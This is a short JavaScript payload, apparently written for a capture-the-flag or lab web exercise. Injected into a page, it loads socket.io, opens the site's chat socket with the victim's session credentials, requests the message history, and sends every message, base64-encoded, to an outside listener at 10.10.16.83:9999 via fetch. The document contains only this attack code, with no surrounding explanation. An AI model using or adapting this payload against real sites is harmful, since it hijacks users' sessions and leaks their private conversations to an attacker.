const script= document.createElement('script');
script.src='/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load',function(){
    const res=axios.get(`/user/api/chat`);
    const socket=io('/',{withCredentials:true});
    socket.on('message',(my_message) => {
        fetch("http://10.10.16.83:9999/?d="+btoa(my_message))
    });
    socket.emit('client_message','history');
});
